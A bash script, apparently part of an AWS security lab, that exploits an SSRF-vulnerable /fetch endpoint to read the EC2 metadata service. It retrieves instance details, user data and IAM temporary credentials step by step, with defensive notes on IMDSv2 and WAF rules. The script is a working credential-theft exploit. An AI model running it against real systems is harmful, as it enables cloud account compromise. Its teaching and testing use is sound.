#!/usr/bin/env bash
# =============================================================================
# 04_ssrf_metadata.sh — SSRF attack for IMDS credential theft
# =============================================================================
# Purpose:
#   Exploit the SSRF vulnerability in the /fetch endpoint to steal IAM role
#   temporary credentials from the EC2 Instance Metadata Service (IMDS).
#
# Attack scenario:
#   1. Access IMDS via /fetch?url=http://169.254.169.254/...
#   2. Retrieve the IAM role name
#   3. Retrieve temporary credentials (AccessKeyId, SecretAccessKey, Token)
#   4. Access AWS resources with stolen credentials (lateral movement)
#
# Learning points:
#   - IMDSv1 is accessible with just HTTP GET -> Easily stolen via SSRF
#   - IMDSv2 requires a PUT to get a token -> Harder to exploit from SSRF
#   - SSRF itself is possible in both Config A/B if /fetch exists
#   - However, in Config B the attack path is limited to ALB only
#
# Defenses:
#   - Enforce IMDSv2 (http_tokens = "required")
#   - Remove proxy functionality like /fetch
#   - Block metadata IP request patterns with WAF
#   - Minimize EC2 IAM role permissions
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

print_header "04: SSRF Attack — IMDS Metadata Theft (SSRF -> IMDS)"

RESULT_FILE="04_ssrf_metadata.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"

# IMDS base URL (link-local address only accessible from within the EC2 instance)
IMDS_BASE="http://169.254.169.254"

echo -e "${BLUE}[*] Target URL: ${TARGET_URL}${NC}"
echo -e "${BLUE}[*] Exploiting /fetch endpoint SSRF vulnerability to access IMDS${NC}"
echo ""

# ---------------------------------------------------------------------------
# Step 1: Verify /fetch endpoint exists
# ---------------------------------------------------------------------------
echo -e "${BLUE}[*] Step 1: Checking for SSRF-vulnerable endpoint${NC}"
echo ""

# First check if /fetch responds
fetch_check=$(curl -sS -o /dev/null -w "%{http_code}" -m 10 "${TARGET_URL}/fetch" 2>/dev/null) || fetch_check="000"

if [[ "${fetch_check}" == "000" ]]; then
    echo -e "${YELLOW}  Cannot connect to /fetch. The application may not be running.${NC}"
    result_text+="/fetch: Connection failed"$'\n'
    save_result "${RESULT_FILE}" "${result_text}"
    exit 0
fi

# If /fetch returns 400, it just needs the url parameter — the endpoint itself exists
if [[ "${fetch_check}" == "200" || "${fetch_check}" == "400" ]]; then
    echo -e "${RED}  /fetch endpoint exists (HTTP ${fetch_check})${NC}"
    result_text+="/fetch: Confirmed (HTTP ${fetch_check})"$'\n'
else
    echo -e "${GREEN}  /fetch endpoint does not exist (HTTP ${fetch_check})${NC}"
    result_text+="/fetch: Does not exist (HTTP ${fetch_check})"$'\n'
    print_blocked "SSRF-vulnerable endpoint does not exist"
    save_result "${RESULT_FILE}" "${result_text}"
    exit 0
fi

echo ""

# ---------------------------------------------------------------------------
# Step 2: Verify IMDSv1 reachability
# ---------------------------------------------------------------------------
# 169.254.169.254 is an IP address only accessible from within the EC2 instance.
# Use the SSRF vulnerability to access this address from outside.
# ---------------------------------------------------------------------------
echo -e "${BLUE}[*] Step 2: Verifying IMDSv1 reachability via SSRF${NC}"
echo -e "${BLUE}[*] Requesting /fetch?url=http://169.254.169.254/latest/meta-data/${NC}"
echo ""

# URL encoding not needed (Flask/Python issues HTTP requests directly)
imds_root=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/" 2>&1) || imds_root=""

result_text+=$'\n'"--- IMDS metadata root ---"$'\n'
result_text+="${imds_root}"$'\n'

if [[ -n "${imds_root}" ]] && echo "${imds_root}" | grep -qi "ami-id\|instance-id\|hostname\|local-ipv4"; then
    echo -e "${RED}  Metadata listing retrieved:${NC}"
    echo "${imds_root}" | head -20
    print_vulnerable "Successfully accessed IMDSv1 via SSRF — Metadata is readable"
else
    echo -e "  IMDS metadata access: Failed"
    echo -e "  Response: ${imds_root:0:200}"

    # NOTE: When IMDSv2 is enforced, IMDS returns HTTP 401 with an empty body.
    # Our Flask proxy (resp.text) strips the status code, so the response will
    # appear as an empty string rather than containing "401" or "Unauthorized".
    if [[ -z "${imds_root}" ]] || echo "${imds_root}" | grep -qi "unauthorized\|401"; then
        print_info "IMDSv2 is likely enforced — IMDS returned empty or 401 (no token)"
        result_text+="Verdict: BLOCKED — IMDSv2 is enabled"$'\n'
    else
        print_info "Failed to reach IMDS (possibly network or app issue)"
        result_text+="Verdict: Unknown — Failed to reach IMDS"$'\n'
    fi
    save_result "${RESULT_FILE}" "${result_text}"
    echo ""
    log "SSRF attack test complete (failed to reach IMDS)"
    exit 0
fi

echo ""

# ---------------------------------------------------------------------------
# Step 3: Collect instance information
# ---------------------------------------------------------------------------
# Attackers first collect basic instance info to understand the attack scope.
# ---------------------------------------------------------------------------
echo -e "${BLUE}[*] Step 3: Collecting instance information${NC}"
echo ""

# Instance ID
instance_id=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/instance-id" 2>/dev/null) || instance_id=""
echo -e "  Instance ID:    ${instance_id}"
result_text+="Instance ID: ${instance_id}"$'\n'

# Availability Zone
az=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/availability-zone" 2>/dev/null) || az=""
echo -e "  AZ:             ${az}"
result_text+="AZ: ${az}"$'\n'

# Private IP
private_ip=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/local-ipv4" 2>/dev/null) || private_ip=""
echo -e "  Private IP:     ${private_ip}"
result_text+="Private IP: ${private_ip}"$'\n'

# Public IP (may be null/error in Config B)
public_ip=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/public-ipv4" 2>/dev/null) || public_ip=""
echo -e "  Public IP:      ${public_ip:-N/A}"
result_text+="Public IP: ${public_ip:-N/A}"$'\n'

# AMI ID
ami_id=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/ami-id" 2>/dev/null) || ami_id=""
echo -e "  AMI ID:         ${ami_id}"
result_text+="AMI ID: ${ami_id}"$'\n'

# Security Groups
sg=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/security-groups" 2>/dev/null) || sg=""
echo -e "  Security Groups: ${sg}"
result_text+="Security Groups: ${sg}"$'\n'

print_vulnerable "Instance internal information fully leaked"

echo ""

# ---------------------------------------------------------------------------
# Step 4: IAM role credential theft (most dangerous)
# ---------------------------------------------------------------------------
# This is the core of the attack. Obtaining IAM role temporary credentials
# allows the attacker to access other AWS services (S3, DynamoDB, Lambda, etc.).
# ---------------------------------------------------------------------------
echo -e "${RED}${BOLD}[*] Step 4: IAM role credential theft (Critical)${NC}"
echo ""

# First, retrieve the IAM role name attached to the instance
iam_role=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/" 2>/dev/null) || iam_role=""

result_text+=$'\n'"--- IAM credential theft ---"$'\n'

if [[ -n "${iam_role}" ]] && ! echo "${iam_role}" | grep -qi "404\|not found\|error"; then
    echo -e "${RED}  IAM role found: ${iam_role}${NC}"
    result_text+="IAM role: ${iam_role}"$'\n'

    # Retrieve temporary credentials using the IAM role name
    # This gives us AccessKeyId, SecretAccessKey, and Token
    creds=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/${iam_role}" 2>/dev/null) || creds=""

    if [[ -n "${creds}" ]] && echo "${creds}" | grep -qi "AccessKeyId"; then
        echo ""
        echo -e "${RED}  =========================================${NC}"
        echo -e "${RED}  IAM temporary credentials stolen:${NC}"
        echo -e "${RED}  =========================================${NC}"
        echo ""

        # Display credentials (for educational purposes. Never output to logs in real environments)
        echo "${creds}" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    print(f\"  AccessKeyId:     {d.get('AccessKeyId', 'N/A')}\")
    print(f\"  SecretAccessKey:  {d.get('SecretAccessKey', 'N/A')[:20]}...(truncated)\")
    print(f\"  Token:            {d.get('Token', 'N/A')[:40]}...(truncated)\")
    print(f\"  Expiration:       {d.get('Expiration', 'N/A')}\")
    print(f\"  Type:             {d.get('Type', 'N/A')}\")
except:
    print(sys.stdin.read())
" 2>/dev/null || echo "${creds}" | head -10

        result_text+="Credential theft: Success"$'\n'
        # Be careful when saving actual credentials even in lab environments
        # Record only AccessKeyId (don't save Secret and Token)
        access_key=$(echo "${creds}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('AccessKeyId',''))" 2>/dev/null || echo "")
        result_text+="AccessKeyId: ${access_key}"$'\n'
        result_text+="SecretAccessKey: [omitted for educational purposes]"$'\n'
        result_text+="Token: [omitted for educational purposes]"$'\n'

        echo ""
        print_vulnerable "IAM temporary credential theft succeeded — CRITICAL"
        print_info "Attackers can access other AWS resources with these credentials"
        print_info "Mitigation: Enforce IMDSv2 (http_tokens = 'required')"
        print_info "Mitigation: Remove the /fetch endpoint"
        print_info "Mitigation: Minimize IAM role permissions"
    else
        echo -e "  Credential retrieval: Failed"
        echo -e "  Response: ${creds:0:200}"
        result_text+="Credential theft: Failed"$'\n'
    fi
else
    echo -e "  IAM role: Not found (role may not be attached)"
    result_text+="IAM role: Not found"$'\n'
    print_info "No IAM role attached, so credential theft is not possible"
    print_info "However, IMDSv1 access itself succeeded, which is still vulnerable"
fi

echo ""

# ---------------------------------------------------------------------------
# Step 5: Retrieve user data (additional info)
# ---------------------------------------------------------------------------
# EC2 user data may contain secrets and scripts.
# It's common for startup scripts to contain DB connection info.
# ---------------------------------------------------------------------------
echo -e "${BLUE}[*] Step 5: Retrieving user data (startup script)${NC}"
echo ""

userdata=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/user-data" 2>/dev/null) || userdata=""

if [[ -n "${userdata}" ]] && ! echo "${userdata}" | grep -qi "404\|not found"; then
    echo -e "${RED}  User data retrieved:${NC}"
    echo "${userdata}" | head -30
    result_text+=$'\n'"--- User data ---"$'\n'
    result_text+="${userdata}"$'\n'
    print_vulnerable "User data leaked — Startup script may contain secrets"
else
    echo -e "  User data: Could not retrieve"
    result_text+="User data: Not retrievable"$'\n'
fi

echo ""

# ---------------------------------------------------------------------------
# Result summary
# ---------------------------------------------------------------------------
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  SSRF Attack Summary (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

if [[ "${CONFIG_MODE}" == "public" ]]; then
    echo -e "${BLUE}  For Config A:${NC}"
    echo -e "    - Attacker knows EC2's IP directly"
    echo -e "    - SSRF -> IMDS -> IAM credentials -> AWS resource access is achievable"
    echo -e "    - Attack path is shortest and hardest to detect"
else
    echo -e "${BLUE}  For Config B:${NC}"
    echo -e "    - Attacker can only access via ALB"
    echo -e "    - ALB has potential to filter web requests"
    echo -e "    - However, as long as the SSRF vulnerability exists, IMDS attack still succeeds"
    echo -e "    - Config B alone is not an SSRF mitigation — Enforcing IMDSv2 is essential"
fi

echo ""

# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "SSRF attack test complete"
